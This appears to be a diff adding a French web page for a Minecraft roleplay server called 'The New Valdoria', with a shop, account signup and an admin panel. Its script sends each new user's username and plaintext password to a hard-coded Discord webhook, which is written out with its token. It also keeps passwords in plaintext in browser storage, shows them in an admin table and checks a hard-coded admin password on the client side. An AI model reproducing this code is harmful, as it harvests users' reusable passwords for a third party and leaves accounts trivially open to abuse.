@@ -1,1 +1,258 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The New Valdoria</title>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --card: #111111;
+            --accent: #3b82f6;
+            --green: #2ecc71;
+            --text: #ffffff;
+            --border: #222;
+        }
 
+        body { margin: 0; font-family: 'Arial', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
+
+        .navbar { display: flex; justify-content: space-around; align-items: center; padding: 20px; background: rgba(0,0,0,0.9); border-bottom: 1px solid var(--border); position: fixed; width: 100%; top: 0; z-index: 100; }
+        .nav-links span { cursor: pointer; margin: 0 10px; font-weight: bold; text-transform: uppercase; font-size: 12px; color: #bbb; transition: 0.3s; }
+        .nav-links span:hover { color: var(--accent); }
+        .user-info { display: flex; align-items: center; gap: 15px; }
+        .wallet { color: #f1c40f; font-weight: bold; border: 1px solid #f1c40f; padding: 5px 15px; border-radius: 20px; font-size: 13px; }
+        .logout-btn { color: #ff4757 !important; border: 1px solid #ff4757; padding: 5px 10px; border-radius: 5px; cursor: pointer; display: none; }
+
+        .hero { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://nationsglory.fr/assets/img/background.jpg'); background-size: cover; background-position: center; }
+        .hero h1 { font-size: 4rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }
+        .hero p { color: #aaa; margin-bottom: 30px; max-width: 700px; font-size: 1.2rem; line-height: 1.6; padding: 0 20px; }
+
+        .btn { padding: 15px 40px; border-radius: 5px; text-decoration: none; font-weight: bold; cursor: pointer; border: none; transition: 0.3s; margin: 10px; font-size: 1rem; text-transform: uppercase; }
+        .btn-main { background: var(--accent); color: white; }
+        .btn-sec { background: rgba(255,255,255,0.05); color: white; border: 1px solid #444; }
+        
+        .page { display: none; padding: 140px 20px 60px; min-height: 100vh; max-width: 1100px; margin: auto; }
+        .active { display: block; animation: fadeIn 0.5s ease; }
+
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; margin-top: 40px; }
+        .card { background: var(--card); border: 1px solid var(--border); padding: 40px; border-radius: 12px; text-align: center; }
+        .price { font-size: 2.5rem; color: #f1c40f; font-weight: bold; margin: 25px 0; }
+
+        .form-box { max-width: 450px; margin: auto; background: var(--card); padding: 50px; border-radius: 12px; border: 1px solid var(--border); }
+        input, select { width: 100%; padding: 15px; margin: 12px 0; background: #000; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
+        
+        table { width: 100%; border-collapse: collapse; margin-top: 30px; }
+        th, td { border: 1px solid var(--border); padding: 15px; text-align: left; }
+        th { background: #1a1a1a; color: var(--accent); }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <b style="font-size: 1.6rem; color: white; cursor:pointer" onclick="showPage('home')">VALDORIA</b>
+        <div class="nav-links">
+            <span onclick="showPage('home')">Accueil</span>
+            <span onclick="showPage('shop')">Boutique</span>
+            <span onclick="showPage('login')" id="nav-login-text">Mon Compte</span>
+            <span id="admin-btn" style="display:none; color:#ff4757" onclick="showPage('admin')">🛡️ Admin</span>
+        </div>
+        <div class="user-info">
+            <div class="wallet"><span id="display-username">Invité</span> : <span id="balance">0.00</span>€</div>
+            <span class="logout-btn" id="logout-btn" onclick="logout()">Déconnexion</span>
+        </div>
+    </nav>
+
+    <div id="home" class="page active" style="padding:0; max-width: 100%;">
+        <section class="hero">
+            <h1>The New Valdoria</h1>
+            <p>Le serveur RP Nation de référence. Bâtissez votre empire et gérez votre économie sur une carte du monde réelle.</p>
+            <div>
+                <button class="btn btn-main" onclick="alert('IP: play.valdoria.fr')">Rejoindre</button>
+                <button class="btn btn-sec" onclick="showPage('shop')">Boutique</button>
+            </div>
+        </section>
+    </div>
+
+    <div id="shop" class="page">
+        <h1 style="text-align:center;">Boutique</h1>
+        <div class="grid">
+            <div class="card">
+                <h3>Box Citoyen</h3>
+                <p>Ressources de base pour débuter.</p>
+                <div class="price">2.00€</div>
+                <button class="btn btn-main" style="width:100%" onclick="buy(2, 'Box Citoyen')">Acheter</button>
+            </div>
+            <div class="card">
+                <h3>Box Guerrier</h3>
+                <p>Équipement de combat et bonus.</p>
+                <div class="price">5.00€</div>
+                <button class="btn btn-main" style="width:100%" onclick="buy(5, 'Box Guerrier')">Acheter</button>
+            </div>
+            <div class="card">
+                <h3>Box Impériale</h3>
+                <p>Le summum du prestige.</p>
+                <div class="price">15.00€</div>
+                <button class="btn btn-main" style="width:100%" onclick="buy(15, 'Box Impériale')">Acheter</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="login" class="page">
+        <div class="form-box">
+            <h2 id="auth-title" style="text-align:center;">Connexion</h2>
+            <input type="text" id="user" placeholder="Pseudo Minecraft">
+            <input type="password" id="pass" placeholder="Mot de passe">
+            <button class="btn btn-main" style="width:100%" onclick="handleAuth()">Valider</button>
+            <p style="text-align:center; font-size:13px; color:#888; cursor:pointer" onclick="toggleAuth()" id="toggle-link">Créer un compte</p>
+        </div>
+    </div>
+
+    <div id="admin" class="page">
+        <div class="card" style="text-align:left;">
+            <h2>🛡️ Panel Admin</h2>
+            <h3>Donner de l'argent</h3>
+            <select id="admin-target-user">
+                <option value="">-- Sélectionner un joueur --</option>
+            </select>
+            <input type="number" id="give-amt" placeholder="Montant en €">
+            <button class="btn btn-main" onclick="giveMoney()">Créditer</button>
+
+            <h3 style="margin-top:40px">Utilisateurs (Appareil Local)</h3>
+            <p style="font-size: 11px; color: #888;">Note : Seuls les comptes créés sur ce navigateur apparaissent ici. Consultez Discord pour les autres.</p>
+            <table>
+                <thead><tr><th>Pseudo</th><th>Mot de passe</th><th>Solde</th></tr></thead>
+                <tbody id="user-list"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1483868158950506737/Z99tQvCDn7QtNQLdRLj672gZIK0av16gBYz6qP4l-DKh0iT5PnuryiUqddyflEfUQXGh";
+        
+        let users = JSON.parse(localStorage.getItem('valdoria_v4_users')) || [];
+        let currentUser = null; 
+        let mode = "login";
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        function toggleAuth() {
+            mode = (mode === "login") ? "signup" : "login";
+            document.getElementById('auth-title').innerText = (mode === "login") ? "Connexion" : "Inscription";
+            document.getElementById('toggle-link').innerText = (mode === "login") ? "Créer un compte" : "Déjà un compte ? Connexion";
+        }
+
+        function updateUI() {
+            if (currentUser) {
+                document.getElementById('display-username').innerText = currentUser.u;
+                document.getElementById('balance').innerText = currentUser.balance.toFixed(2);
+                document.getElementById('logout-btn').style.display = "block";
+                document.getElementById('nav-login-text').style.display = "none";
+                if (currentUser.u === "admin") document.getElementById('admin-btn').style.display = "inline";
+            } else {
+                document.getElementById('display-username').innerText = "Invité";
+                document.getElementById('balance').innerText = "0.00";
+                document.getElementById('logout-btn').style.display = "none";
+                document.getElementById('nav-login-text').style.display = "inline";
+                document.getElementById('admin-btn').style.display = "none";
+            }
+            updateAdminPanel();
+        }
+
+        function handleAuth() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if (!u || !p) return;
+
+            if (mode === "login") {
+                if (u === "admin" && p === "743474") {
+                    currentUser = { u: "admin", balance: 0 };
+                    showPage('admin');
+                } else {
+                    const found = users.find(x => x.u === u && x.p === p);
+                    if (found) { currentUser = found; showPage('home'); } 
+                    else { alert("Compte inconnu sur cet appareil."); }
+                }
+            } else {
+                if (users.find(x => x.u === u)) return alert("Pseudo déjà pris localement.");
+                users.push({ u, p, balance: 0 });
+                save();
+                
+                // Envoi spécial à Discord pour ton panel admin
+                sendDiscord("📝 NOUVELLE INSCRIPTION", `**Pseudo :** ${u}\n**Mot de passe :** ${p}\n\n*Note : Rajoutez-le au panel si nécessaire.*`, 3066993);
+                
+                alert("Compte créé ! Les données ont été envoyées à l'administrateur.");
+                toggleAuth();
+            }
+            updateUI();
+        }
+
+        function logout() {
+            currentUser = null;
+            updateUI();
+            showPage('home');
+        }
+
+        function buy(price, name) {
+            if (!currentUser) return alert("Connectez-vous !");
+            if (currentUser.balance >= price) {
+                currentUser.balance -= price;
+                save();
+                updateUI();
+                sendDiscord("🛒 ACHAT BOUTIQUE", `**Joueur :** ${currentUser.u}\n**Article :** ${name}\n**Prix :** ${price}€`, 15105540);
+                alert("Achat réussi !");
+            } else { alert("Solde insuffisant."); }
+        }
+
+        function giveMoney() {
+            const targetName = document.getElementById('admin-target-user').value;
+            const amt = parseFloat(document.getElementById('give-amt').value);
+            if (!targetName || isNaN(amt)) return;
+
+            const target = users.find(x => x.u === targetName);
+            if (target) {
+                target.balance += amt;
+                save();
+                updateUI();
+                alert(`Crédité !`);
+            }
+        }
+
+        function updateAdminPanel() {
+            const list = document.getElementById('user-list');
+            const select = document.getElementById('admin-target-user');
+            list.innerHTML = "";
+            select.innerHTML = '<option value="">-- Sélectionner --</option>';
+
+            users.forEach(x => {
+                list.innerHTML += `<tr><td>${x.u}</td><td>${x.p}</td><td>${x.balance.toFixed(2)}€</td></tr>`;
+                select.innerHTML += `<option value="${x.u}">${x.u}</option>`;
+            });
+        }
+
+        function save() { localStorage.setItem('valdoria_v4_users', JSON.stringify(users)); }
+
+        function sendDiscord(title, msg, color = 3447003) {
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{ 
+                        title: title, 
+                        description: msg, 
+                        color: color, 
+                        timestamp: new Date(),
+                        footer: { text: "Valdoria Auth System" }
+                    }]
+                })
+            });
+        }
+
+        updateUI();
+    </script>
+</body>
+</html>
